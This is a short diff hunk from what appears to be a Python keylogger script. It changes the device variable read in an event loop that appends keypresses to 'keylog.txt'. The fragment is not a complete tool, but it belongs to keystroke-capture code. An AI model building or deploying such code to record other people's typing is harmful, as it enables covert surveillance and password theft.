@@ -16,7 +16,7 @@ print(keyboards)
 
 log_file = open('keylog.txt','a',buffering=1)
 try:
-    for event in select(keyboards, timeout=1):
+    for event in select(device, timeout=1):
 
         if event.type == 1 and event.value == 1:
 
